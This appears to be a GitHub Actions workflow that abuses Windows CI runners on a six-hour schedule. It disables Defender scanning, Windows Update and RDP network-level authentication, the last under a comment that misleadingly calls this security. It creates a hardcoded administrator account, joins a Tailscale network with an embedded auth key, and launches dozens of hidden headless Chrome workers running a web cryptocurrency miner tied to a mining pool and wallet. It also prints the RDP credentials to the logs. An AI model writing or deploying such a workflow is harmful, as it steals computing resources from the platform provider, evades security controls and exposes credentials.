name: RDP Auto-Recreate with Miner Pro

on:
  workflow_dispatch:
    inputs:
      miner_workers:
        description: 'Number of miner workers'
        required: false
        default: '20'
        type: choice
        options:
        - '10'
        - '15'
        - '20'
        - '25'
        - '30'
  schedule:
    - cron: "0 */6 * * *"  # Every 6 hours

env:
  RDP_USER: "RDPUser"
  RDP_PASSWORD: "DefaultPass!234"
  MAX_RUNTIME: 340    # 5h40m
  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x"

jobs:
  rdp-miner-pro:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Setup Environment Variables
        run: |
          $workers = '${{ github.event.inputs.miner_workers || 20 }}'
          echo "MINER_WORKERS=$workers" >> $env:GITHUB_ENV
          echo "BUILD_ID=$env:GITHUB_RUN_ID" >> $env:GITHUB_ENV

      - name: System Optimization
        run: |
          # Disable Windows Defender
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableScriptScanning $true
          Set-MpPreference -DisableArchiveScanning $true

          # Power settings - prevent sleep
          powercfg /change standby-timeout-ac 0
          powercfg /change hibernate-timeout-ac 0
          powercfg /change monitor-timeout-ac 0
          powercfg /setactive SCHEME_MIN

          # Disable Windows Update
          Stop-Service -Name "wuauserv" -Force
          Set-Service -Name "wuauserv" -StartupType Disabled

          # Increase RDP performance
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "MaxInstanceCount" -Value 10
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxMonitors" -Value 4
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxXResolution" -Value 3840
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "MaxYResolution" -Value 2160

      - name: Enable and Configure RDP
        run: |
          # Enable RDP
          Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

          # Configure Network Level Authentication for better security
          Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 0

      - name: Create Secure RDP User
        run: |
          $securePassword = ConvertTo-SecureString $env:RDP_PASSWORD -AsPlainText -Force
          
          # Delete user if exists and recreate
          if (Get-LocalUser -Name $env:RDP_USER -ErrorAction SilentlyContinue) {
              Remove-LocalUser -Name $env:RDP_USER
          }
          
          New-LocalUser -Name $env:RDP_USER -Password $securePassword -AccountNeverExpires -PasswordNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member $env:RDP_USER
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member $env:RDP_USER
          
          # Enable the account
          Enable-LocalUser -Name $env:RDP_USER

      - name: Install Required Software
        run: |
          # Install Chrome silently
          $chromeInstaller = "$env:TEMP\chrome_installer.exe"
          Invoke-WebRequest "https://dl.google.com/chrome/install/latest/chrome_installer.exe" -OutFile $chromeInstaller
          Start-Process -FilePath $chromeInstaller -ArgumentList "/silent", "/install" -Wait
          Remove-Item $chromeInstaller

          # Install Tailscale
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi"
          $installer = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest $tsUrl -OutFile $installer
          Start-Process msiexec.exe -ArgumentList "/i `"$installer`" /quiet /norestart" -Wait
          Remove-Item $installer
          Start-Sleep -Seconds 5

      - name: Setup Tailscale VPN
        run: |
          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
          $hostname = "GH-RDP-$env:GITHUB_RUN_ID"
          
          # Wait for Tailscale service to be ready
          $attempt = 0
          while ($attempt -lt 10) {
              try {
                  & $tsExe status
                  break
              } catch {
                  $attempt++
                  Start-Sleep -Seconds 5
              }
          }
          
          # Connect to Tailscale
          & $tsExe up --authkey "tskey-auth-kgHX1ZRZ1G11CNTRL-qgNCSBNJTy7qbFDEFZXty7chwnmUoxQrG" --hostname $hostname --reset
          
          # Get IP with retry logic
          $retryCount = 0
          while ($retryCount -lt 10) {
              $ip = & $tsExe ip -4 2>$null
              if ($ip -and $ip -ne "0.0.0.0") {
                  echo "TS_IP=$ip" >> $env:GITHUB_ENV
                  Write-Host "‚úÖ Tailscale IP: $ip"
                  break
              }
              $retryCount++
              Start-Sleep -Seconds 10
          }
          
          if (-not $env:TS_IP) {
              throw "‚ùå Failed to get Tailscale IP"
          }

      - name: Deploy Advanced Miner System
        run: |
          # Create simplified miner script
          $minerScript = @"
          `$workers = `$env:MINER_WORKERS
          `$minerUrl = "`$env:MINER_URL&workers=`$workers"
          
          for (`$i = 1; `$i -le `$workers; `$i++) {
              Start-Job -ScriptBlock {
                  while (`$true) {
                      try {
                          Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless", "--disable-gpu", "--no-sandbox", "--remote-debugging-port=9`$using:i", "--app=`$using:minerUrl" -WindowStyle Hidden -PassThru
                          Start-Sleep -Seconds 600
                      } catch {
                          Start-Sleep -Seconds 30
                      }
                  }
              } -Name "miner-worker-`$i"
          }
          
          Write-Host "Started `$workers miner workers"
          while (`$true) { Start-Sleep -Seconds 60 }
"@
          $scriptPath = "$env:TEMP\miner_manager.ps1"
          $minerScript | Out-File -FilePath $scriptPath -Encoding UTF8
          
          # Start miner manager
          Start-Job -ScriptBlock {
              param($path)
              powershell -File $path
          } -ArgumentList $scriptPath

      - name: Create Connection Info File
        run: |
          $connectionInfo = @"
RDP CONNECTION INFO
IP: $env:TS_IP
User: $env:RDP_USER
Pass: $env:RDP_PASSWORD
Workers: $env:MINER_WORKERS
Runtime: $env:MAX_RUNTIME minutes
"@
          $connectionInfo | Out-File -FilePath "$env:GITHUB_WORKSPACE\RDP_Info.txt" -Encoding UTF8
          
          Write-Host "=========================================="
          Write-Host "üöÄ RDP SESSION READY"
          Write-Host "IP: $env:TS_IP"
          Write-Host "User: $env:RDP_USER" 
          Write-Host "Pass: $env:RDP_PASSWORD"
          Write-Host "Workers: $env:MINER_WORKERS"
          Write-Host "Duration: $env:MAX_RUNTIME minutes"
          Write-Host "=========================================="

      - name: Monitor Session
        run: |
          $startTime = Get-Date
          $endTime = $startTime.AddMinutes($env:MAX_RUNTIME)
          
          while ((Get-Date) -lt $endTime) {
              $elapsed = [int]((Get-Date) - $startTime).TotalMinutes
              $remaining = [int]($endTime - (Get-Date)).TotalMinutes
              
              Write-Host "Elapsed: $elapsed minutes - Remaining: $remaining minutes - Workers: $env:MINER_WORKERS"
              Start-Sleep -Seconds 60
          }

      - name: Cleanup Resources
        if: always()
        run: |
          Write-Host "Cleaning up..."
          Get-Job | Stop-Job | Remove-Job -Force
          Get-Process -Name "chrome*" -ErrorAction SilentlyContinue | Stop-Process -Force
          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
          Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
          Write-Host "Cleanup completed"
